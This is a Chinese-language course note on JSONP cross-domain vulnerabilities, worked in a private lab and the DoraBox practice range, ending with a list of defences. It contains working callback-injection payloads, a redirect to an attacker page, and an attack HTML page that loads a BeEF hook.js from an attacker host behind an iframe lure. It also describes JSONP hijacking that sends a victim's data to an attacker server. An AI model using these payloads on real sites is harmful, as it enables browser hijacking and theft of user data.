[TOC]



# ==JSONP跨域访问漏洞==

## 课程目标

1、理解JSONP跨域访问漏洞原理

2、掌握JSONP跨域访问的防御方案

## 一、漏洞一：利用回调GetCookie

**说变了，就是没有对callback参数的值进行校验，导致完全由用户可控，难免会有领域中人**

当list-json.html页面中，构造的payload如下，便可直接触发弹窗

```html
<script src="http://192.168.230.147/list-json.php?callback=alert(/1/)//"></script>
```

访问攻击服务器上的http://192.168.230.135/list-json.html

![image-20240813163731481](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240813163731481.png)

那么，我们在弹窗代码位置处就可以做很多事情了，比如发送当前一个请求，直接定位到攻击服务器上访问一个钓鱼网站，该网站由beefxss挂钩。

- 开启beefxss，真很简单，直接上kali

- 我们在攻击服务器192.168.230.135上创建一个这样的html文件，命名为jsonp-beefxss.html。当然，我们可以让其优化一点

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>jsonp-beefxss</title>
</head>
<body>
    <script src="http://192.168.230.128:3000/hook.js"></script>
    <!-- <script>location.href="https://www.woniuxy.com/"</script> -->
     <iframe src="https://www.woniuxy.com/" width=100% height="900"></iframe>
</body>
</html>
```

- 访问http://192.168.230.135/jsonp-beefxss.html

  ![image-20240813170902761](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240813170902761.png)

  ![image-20240813171023969](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240813171023969.png)

- 当，恶意html页面做好了之后，我们去访问list-json.html时，给callback传入的参数就可以写成payload

  ```html
  <script src="http://192.168.230.135/list-json.php?callback=location.href='http://192.168.230.135/jsonp-beefxss.html'//"></script>
  ```

  接下来我去访问 http://192.168.230.135/list-json.html 就会跳转到 http://192.168.230.135/jsonp-beefxss.html 直接实现攻击，但事实上，完全可以不用这么麻烦。直接诱使用户点击就好了，干嘛这么多弯弯绕

**当然，我们需要对回调函数的名称进行严格的限制，比如限制其长度，查询其关键词，白名单等方式** 在list-json.php 后台代码中校验

![image-20240813171954755](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240813171954755.png)

## 二、漏洞二：利用CSRF获取数据

比如，攻击者发现某个站点有csrf漏洞，然后攻击者想获取用户在该站点下的响应数据，但是攻击者并没有用户的账密，那么攻击者该怎么办？攻击者就想办法诱导用户点击攻击者构造的恶意链接，该链接代码中将会让用户访问该站点有csrf漏洞的页面，然后通过构造js回调函数，实现数据的发送。

- 发给受害者一个恶意链接，该链接首先让用户访问有CSRF漏洞的这个页面，并且传入参数calback的值为test，然后，在该链接中构建 js 回调函数 test() ，其功能为向攻击服务器发送一个请求，比如攻击服务器有一个jsonprecv.php ，那么 test 回调函数就会向这个页面发起请求，将有CSRF漏洞的这个页面的数据发送到攻击者服务器

DoraBox靶场中有这样一道题目 在CSRF中有一个JSONP 劫持 http://192.168.230.147/dorabox/csrf/jsonp.php?callback=test 

![image-20240813174113029](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240813174113029.png)

其中该题目的源代码中有如下一句代码

```php
$callback = htmlsprcialchars($_GET['callback']);
```

上述代码将我们传入的参数进行了实体字符转换，杜绝了XSS获取Cookie 的漏洞。但是该页面依然存在JSONP漏洞，我们要做的就是，让已登录该页面的受害者，访问我们构造的恶意链接，在 192.168.230.135 上创建页面 jsonrecv.php

由于环境的原因，我暂时使用老师的代码。我只需将应用服务器ip地址更改为192.168.230.147，攻击服务器ip地址更改为192.168.230.135

![image-20240813174610414](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240813174610414.png)

然后再添加 jsonuse.html 

![image-20240813174650790](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240813174650790.png)

我们可以选择诱使受害者直接访问 攻击服务器上的jsonuse.html 也可以利用DoraBox中的xss漏洞构造链接，就看用户点不点了

> DoraBox中的存储型XSS是将输入的内容直接存储到本页面，并没有存在数据库，所以该页面的源代码还需要有写权限

## 三、JSON攻击防御方案

产生JSONP攻击的核心在于没有对调用地方进行校验

- 前后端约定JSONP请求的JS回调函数名，不能由用户自己决定
- 严格安全的防止CSRF方式调用JSON文件：限制Referer，部署一次性Token或其他Token校验
- 严格按照JSON格式标准输出 Content-Type 及编码 （Content-Type:application/json; charset=utf-8），避免被XSS利用。可以在PHP源码中添加 `header("Content-Type:application/json");` 即可。
- 严格过滤callback函数名以及JSON里的输出数据
- 严格限制对JSONP输出，callback函数名的长度及内容
- 其他一些比较“猥琐”的方法:如在 Callback 输出之前加入其他字符(如:/**/、回车换行)这样不影响JSON 文件加载，又能一定程度预防其他文件格式的输出。还比如 Gmail 早起使用 AJAX 的方式获取 JSON，听说在输出 JSON 之前加入 while(1);这样的代码来防止 JS 远程调用(可以试试)。